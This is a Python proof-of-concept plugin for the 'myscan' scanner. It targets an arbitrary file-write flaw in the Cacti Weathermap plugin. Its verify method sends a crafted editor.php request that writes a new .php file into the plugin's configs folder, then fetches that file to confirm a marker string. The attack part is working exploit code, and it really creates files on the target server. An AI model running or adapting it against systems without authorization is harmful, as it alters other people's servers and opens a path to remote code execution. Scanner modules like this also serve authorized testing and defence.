#!/usr/bin/env python3
# @Time    : 2020-05-09
# @Author  : caicai
# @File    : poc_cacti-weathermap-file-write_2019.py


# 此脚本为编写perfloder的poc模板，编写poc时复制一份此模版为pocname即可，用户可在verify方法下添加自己代码
from myscan.lib.parse.response_parser import response_parser  ##写了一些操作resonse的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.config import scan_set
from myscan.lib.core.common import get_random_str


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "cacti-weathermap-file-write"
        self.vulmsg = "referer: https://www.secpulse.com/archives/47690.html"
        self.level = 3  # 0:Low  1:Medium 2:High

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return
        random_file = get_random_str(5).lower()
        req = {
            "method": "GET",
            "url": self.url + "plugins/weathermap/editor.php?plug=0&mapname={}.php&action=set_map_properties&param=&param2=&debug=existing&node_name=&node_x=&node_y=&node_new_name=&node_label=&node_infourl=&node_hover=&node_iconfilename=--NONE--&link_name=&link_bandwidth_in=&link_bandwidth_out=&link_target=&link_width=&link_infourl=&link_hover=&map_title=46ea1712d4b13b55b3f680cc5b8b54e8&map_legend=Traffic+Load&map_stamp=Created:+%b+%d+%Y+%H:%M:%S&map_linkdefaultwidth=7".format(
                random_file),
            "timeout": 10,
            "allow_redirects": False,
            "verify": False,
        }
        r = request(**req)
        if r != None and r.status_code == 200:
            req["url"] = self.url + "plugins/weathermap/configs/{}.php".format(random_file)
            r1 = request(**req)
            if r1 != None and r1.status_code == 200 and b"46ea1712d4b13b55b3f680cc5b8b54e8" in r1.content:
                parser_ = response_parser(r1)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
